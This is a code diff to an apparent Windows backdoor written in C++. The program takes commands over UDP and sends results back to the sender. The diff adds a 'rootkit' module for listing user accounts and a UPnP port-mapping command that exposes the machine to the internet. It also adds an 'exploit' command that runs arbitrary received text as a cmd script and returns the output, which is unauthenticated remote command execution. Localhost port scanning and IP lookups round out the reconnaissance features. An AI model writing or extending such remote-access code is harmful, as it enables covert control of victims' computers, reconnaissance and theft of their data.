@@ -24,6 +24,8 @@
 #include "port.hpp"
 #include "upnp.hpp"
 #include "ip.hpp"
+#include "rootkit.hpp"
+#include "strutils.hpp"
 
 using namespace std;
 namespace init {
@@ -52,33 +54,6 @@ unsigned short pick_random_port() {
 		return p;
 	}
 	return 0;
-}
-
-vector<string> get_username_list() {
-	LPUSER_INFO_1 pBuf = NULL;
-	DWORD entriesRead = 0, totalEntries = 0, resumeHandle = 0;
-
-	NET_API_STATUS nStatus = NetUserEnum(NULL, 1, FILTER_NORMAL_ACCOUNT, reinterpret_cast<LPBYTE*>(&pBuf), MAX_PREFERRED_LENGTH, &entriesRead, &totalEntries, &resumeHandle);
-
-	vector<string> user_list;
-
-	if (nStatus == NERR_Success || nStatus == ERROR_MORE_DATA) {
-		for (DWORD i = 0; i < entriesRead; i++) {
-
-			if (pBuf[i].usri1_flags & UF_ACCOUNTDISABLE) continue;
-
-			int size_needed = WideCharToMultiByte(CP_ACP, 0, pBuf[i].usri1_name, -1, NULL, 0, NULL, NULL);
-			string strTo(size_needed - 1, 0);
-			WideCharToMultiByte(CP_ACP, 0, pBuf[i].usri1_name, -1, &strTo[0], size_needed, NULL, NULL);
-			user_list.push_back(strTo);
-		}
-	}
-
-	if (pBuf != NULL) {
-		NetApiBufferFree(pBuf);
-	}
-
-	return user_list;
 }
 
 template <typename T>
@@ -178,7 +153,7 @@ int main() {
 		string receivedString = string(buf);
 
 		if (receivedString == "!help") {
-			const string reply = "open cmd\\nget user\\nscan ports tcp";
+			const string reply = "open cmd\\nget user\\nscan ports tcp\\nget public ip\\nget local ip\\nopen upnp port\\nexploit -";
 			sendto(
 				udpListenSock,
 				reply.c_str(),
@@ -204,7 +179,7 @@ int main() {
 			continue;
 		}
 		if (receivedString == "get user") {
-			vector<string> lst = get_username_list();
+			vector<string> lst = rootkit::get_username_list();
 			string reply = "";
 			for (string name : lst) {
 				reply += name;
@@ -222,10 +197,16 @@ int main() {
 		}
 		if (receivedString == "scan ports tcp") {
 			const vector<unsigned short> ports = port::scan_target_ports_tcp("127.0.0.1", unfamousPortListVector);
-			string reply = "";
-			for (unsigned short p : ports) {
-				reply += to_string(p);
-				reply += "\\n";
+			string reply;
+			if (ports.size() == 0) {
+				reply = "no opened tcp ports found";
+			}
+			else {
+				reply = "";
+				for (unsigned short p : ports) {
+					reply += to_string(p);
+					reply += "\\n";
+				}
 			}
 			sendto(
 				udpListenSock,
@@ -249,9 +230,32 @@ int main() {
 			);
 			continue;
 		}
-		//if (receivedString == "open upnp port") {
-		//	
-		//}
+		if (receivedString == "open upnp port") {
+			bool availiable = upnp::is_upnp_available();
+			string reply = "";
+			if (availiable) {
+				string localIp = upnp::get_local_ip();
+				unsigned short port = pick_random_port();
+				bool result = upnp::map_upnp_port(port, localIp);
+				if (result)
+					reply = "success to map upnp port\nport: " + to_string(port) + " localIp: " + localIp;
+				else
+					reply = "failed to map upnp port";
+			}
+			else {
+				reply = "upnp is not supported for this device";
+			}
+
+			sendto(
+				udpListenSock,
+				reply.c_str(),
+				static_cast<int>(reply.length()),
+				0,
+				reinterpret_cast<const struct sockaddr*>(&from),
+				fromLen
+			);
+			continue;
+		}
 		
 		if (receivedString == "get public ip") {
 			PublicAddr IP = ip::get_public_ip_udp();
@@ -268,15 +272,49 @@ int main() {
 			continue;
 		}
 
-		const string reply = "Hello from UDP server\n";
-		sendto(
-			udpListenSock,
-			reply.c_str(),
-			static_cast<int>(reply.length()),
-			0,
-			reinterpret_cast<const struct sockaddr*>(&from),
-			fromLen
-		);
+		if (receivedString == "korean test") {
+			cout << "한국어 깨지나 안깨지나 테스트" << endl;
+			const string reply = "successfully logged korean";
+			sendto(
+				udpListenSock,
+				reply.c_str(),
+				static_cast<int>(reply.length()),
+				0,
+				reinterpret_cast<const struct sockaddr*>(&from),
+				fromLen
+			);
+		}
+
+		if (receivedString.starts_with("exploit")) {
+			string script = rootkit::to_cmd_script(receivedString);
+			string reply = rootkit::run_cmd_with_output(script); // == result
+			sendto(
+				udpListenSock,
+				reply.c_str(),
+				static_cast<int>(reply.length()),
+				0,
+				reinterpret_cast<const struct sockaddr*>(&from),
+				fromLen
+			);
+			continue;
+		}
+		
+		if (receivedString.starts_with("exploit-bat")) {
+			vector<string> splitted = strutils::split_string(receivedString);
+
+		}
+
+		if (receivedString != "") {
+			const string reply = "Hello from UDP server\n";
+			sendto(
+				udpListenSock,
+				reply.c_str(),
+				static_cast<int>(reply.length()),
+				0,
+				reinterpret_cast<const struct sockaddr*>(&from),
+				fromLen
+			);
+		}
 	}
 
 
